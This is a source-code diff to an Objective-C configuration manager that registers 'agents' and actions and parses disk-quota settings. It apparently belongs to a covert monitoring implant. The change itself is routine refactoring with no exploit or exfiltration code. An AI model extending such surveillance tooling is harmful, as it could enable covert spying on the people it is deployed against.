@@ -18,6 +18,7 @@
 #import "RCSMEncryption.h"
 #import "RCSMCommon.h"
 #import "RCSMUtils.h"
+#import "RCSMDiskQuota.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -26,12 +27,6 @@
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
-
-//
-// This is always because of our wonderful (btw do we really need to change it?)
-// configuration file.
-//
-static int actionCounter = 0;
 
 @interface RCSMConfManager (hidden)
 
@@ -160,18 +155,16 @@ static int actionCounter = 0;
               
               [taskManager registerAction: tempData
                                      type: header->type
-                                   action: actionCounter];
+                                   action: i];
             }
           else
             {
               [taskManager registerAction: nil
                                      type: header->type
-                                   action: actionCounter];
+                                   action: i];
               
               pos += sizeof(int) << 1;
             }
-          
-          actionCounter++;
         }
     }
   
@@ -205,7 +198,7 @@ static int actionCounter = 0;
   {
     for (int i=0; i<crisis_conf->network_process_count; i++) 
     {
-      int len = _utf16len((unichar*)process_name)*sizeof(unichar);
+      int len = _utf16len((unichar*)process_name) * sizeof(unichar);
       
   #ifdef DEBUG_CONF_MANAGER
       NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
@@ -338,6 +331,9 @@ static int actionCounter = 0;
                                         andStatus: header->status];
             }
           
+#ifdef DEBUG_CONF_MANAGER
+          verboseLog(@"agent 0x%x: %@", header->agentID, tempData);
+#endif
           [taskManager registerAgent: tempData
                              agentID: header->agentID
                               status: header->status];
@@ -397,8 +393,6 @@ static int actionCounter = 0;
 
 - (BOOL)loadConfiguration
 {
-  actionCounter = 0;
-  
   NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                  [[NSBundle mainBundle] bundlePath],
                                  gConfigurationName];
@@ -570,6 +564,27 @@ static int actionCounter = 0;
 #endif
               
               return NO;
+            }
+            
+          // setting global quota params
+          if ([self _searchDataForToken:mConfigurationData 
+                                  token:LOGRP_CONF_DELIMITER 
+                               position:&pos])
+            {
+              // Skip the EVENT Token + \00
+              pos += strlen(LOGRP_CONF_DELIMITER) + 1;
+             
+              UInt32 globalConfBytes[3];
+              
+              [mConfigurationData getBytes:globalConfBytes
+                                     range:NSMakeRange(pos, sizeof(UInt32)*3)];
+              
+              NSData *tmpGlobalConf = [[NSData alloc] initWithBytes:globalConfBytes
+                                                             length:sizeof(UInt32)*3];
+                                                              
+              [[RCSMDiskQuota sharedInstance] setGlobalQuotaParam:tmpGlobalConf];
+              
+              [tmpGlobalConf release];                                                 
             }
         }
       else
